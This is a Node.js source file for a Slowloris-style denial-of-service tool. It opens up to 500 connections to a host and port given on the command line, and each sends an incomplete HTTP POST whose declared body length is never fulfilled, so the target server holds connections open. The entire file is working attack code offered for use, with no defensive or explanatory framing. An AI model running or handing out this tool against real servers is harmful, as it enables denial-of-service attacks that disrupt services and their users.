// TODO: make host and port configurable with arguments 

const net = require("net");
const argv = require('minimist')(process.argv.slice(2));
const validIp = require('./util/validations').validIp
const validPort = require('./util/validations').validPort

const maxConnections = 500;
const connections = [];

const host = argv.host;
const port = argv.port;

class Connection {
  constructor(h, p) {
    this.h = h;
    this.p = p;

    this.state = "active";
    this.t = Date.now();

    this.client = net.connect({ port: p, host: h }, () => {
      process.stdout.write("Connected, Sending... ");

      this.client.write(
        "POST / HTTP/1.1\r\nHost: " +
        host +
        "\r\n" +
        "Content-Type: application/x-www-form-urlenconded\r\n" +
        "Content-Length: 385\r\n\r\nvx=321&d1=fire&l"
      );

      process.stdout.write("Written.\n");
    });
    this.client.on("data", data => {
      console.log("\t-Received " + data.length + " bytes...");
      this.client.end();
    });
    this.client.on("end", () => {
      const d = Date.now() - this.t;
      this.state = "ended";

      console.log(
        "\t-Disconnected (duration: " +
        (d / 1000).toFixed(3) +
        " seconds, remaining open: " +
        connections.length +
        ")."
      );
    });
    this.client.on("error", () => {
      this.state = "error";
    });

    connections.push(this);
  }
}

const slowLoris = () => setInterval(() => {
  let notify = false;

  // Add another connection if we haven't reached
  // our max:
  if (connections.length < maxConnections) {
      new Connection(host, port);
      notify = true;
  }

  // Remove dead connections
  connections.filter(function (v) {
      return v.state === "active";
  });

  if (notify) {
      console.log(
          "Active connections: " + connections.length + " / " + maxConnections
      );
  }
}, 500);

if (host && port) {
  if (validIp(host) && validPort(port)) {
    slowLoris();
  } else {
    console.log("You have entered invalid host or port")
  }
} else {
  console.log("Usage: slowloris --host=1.0.0.0 --port=8080")
}

